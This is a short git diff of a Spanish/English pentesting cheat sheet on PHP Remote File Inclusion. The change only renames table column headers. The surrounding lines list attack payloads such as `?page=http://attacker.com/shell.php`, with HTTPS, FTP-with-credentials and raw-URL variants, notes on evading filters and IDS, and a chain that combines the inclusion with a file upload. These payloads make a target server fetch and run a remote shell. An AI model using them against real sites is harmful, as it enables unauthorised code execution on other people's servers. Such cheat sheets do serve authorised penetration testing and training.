@@ -22,7 +22,7 @@ linked:
 
 ## HTTP / HTTPS Remote Inclusion
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | HTTP basic | `?page=http://attacker.com/shell.php` | Standard. |
 | HTTPS | `?page=https://attacker.com/shell.php` | TLS — bypass HTTP filters / IDS. |
@@ -63,7 +63,7 @@ ___
 
 ## FTP / SMB Schemes
 
-| **Scheme** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | FTP anonymous | `?page=ftp://attacker.com/shell.php` | Anonymous read. |
 | FTP authenticated | `?page=ftp://user:pass@attacker.com/shell.php` | Userinfo en URL. |
@@ -82,7 +82,7 @@ ___
 
 ## Raw URL Inclusion
 
-| **Variant** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Direct URL | `?page=http://attacker.com/x` | Standard. |
 | URL sin extension | `?page=http://attacker.com/raw` | If server appends `.php`. |
@@ -103,7 +103,7 @@ ___
 
 ## Combine con Local Upload
 
-| **Workflow** | **Step** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Upload PHP en target | Use file upload feature | Standard chain. |
 | Upload `.txt` con PHP code | Bypass extension filter | Standard. |
